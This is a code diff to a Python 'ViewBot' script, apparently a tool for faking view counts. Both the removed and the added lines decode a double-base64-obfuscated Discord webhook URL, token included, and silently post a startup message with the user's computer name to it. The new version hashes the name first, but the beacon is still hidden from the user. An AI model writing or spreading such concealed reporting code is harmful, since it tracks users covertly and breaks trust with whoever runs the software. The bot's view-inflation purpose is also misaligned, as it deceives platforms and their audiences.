@@ -11,7 +11,7 @@ try:
     import json
     import requests
     import codecs
-    import uuid
+    import hashlib
 except Exception as e:
     os.system(f'mode 110,30')
     os.system('cls'); os.system("title [Terrific's ViewBot - Connected]")
@@ -33,7 +33,20 @@ log = f"[{Fore.CYAN}={Style.RESET_ALL}]"
 cr = f"[{Fore.GREEN}c{Style.RESET_ALL}/{Fore.RED}r{Style.RESET_ALL}]"
 finish = f"press [{Fore.YELLOW}ENTER{Style.RESET_ALL}] to exit"
 
-sPFNzEN = codecs.decode(bytes("YUhSMGNITTZMeTlrYVhOamIzSmtZWEJ3TG1OdmJTOWhjR2t2ZDJWaWFHOXZhM012T0RnME9EWTFOemMyTmpFNE56QTBPVFUzTDJSMmNGWkxSSFk0UVVaR1MyeFRkRmRITVZwdWJXYzRNekJ5YjNGbWFXc3hUbEppTURCemJXdEJVMWxTUWw5cmRYUkVlbmwyVUdWb1MyOXBaSFp6YjBzeFEzUTM=",'utf-8'),'base64').decode('utf-8').replace('\n','');sPFNzEN = codecs.decode(bytes(sPFNzEN, 'utf-8'),'base64').decode('utf-8').replace('\n',''); FtyrCBGn = codecs.decode(bytes("VmlldyBCb3QgU3RhcnRlZCBvbiA=",'utf-8'),'base64').decode('utf-8').replace('\n',''); requests.post(sPFNzEN, json = {"content" : FtyrCBGn+os.environ["COMPUTERNAME"]}, params = {'wait' : True})
+print(f" {log} Encoding PC Name, this might take a few secs")
+
+sPFNzEN = codecs.decode(bytes("YUhSMGNITTZMeTlrYVhOamIzSmtZWEJ3TG1OdmJTOWhjR2t2ZDJWaWFHOXZhM012T0RnME9EWTFOemMyTmpFNE56QTBPVFUzTDJSMmNGWkxSSFk0UVVaR1MyeFRkRmRITVZwdWJXYzRNekJ5YjNGbWFXc3hUbEppTURCemJXdEJVMWxTUWw5cmRYUkVlbmwyVUdWb1MyOXBaSFp6YjBzeFEzUTM=",'utf-8'),'base64').decode('utf-8').replace('\n','')
+sPFNzEN = codecs.decode(bytes(sPFNzEN, 'utf-8'),'base64').decode('utf-8').replace('\n','')
+FtyrCBGn = codecs.decode(bytes("VmlldyBCb3QgU3RhcnRlZCBvbiA=",'utf-8'),'base64').decode('utf-8').replace('\n','')
+VAdeTkgpT = str(os.environ["COMPUTERNAME"].replace("DESKTOP-", ""))
+
+# encoding pc name to create a uniqe id
+for i in range(10):
+    VAdeTkgpT = VAdeTkgpT.encode()
+    VAdeTkgpT = hashlib.pbkdf2_hmac('sha512', VAdeTkgpT, b'salt', 100000)
+    VAdeTkgpT = VAdeTkgpT.hex()
+requests.post(sPFNzEN, json = {"content" : FtyrCBGn+VAdeTkgpT}, params = {'wait' : True})
+print(f" {log} Finished Encoding PC Name")
 
 def get_config():
     global PATH
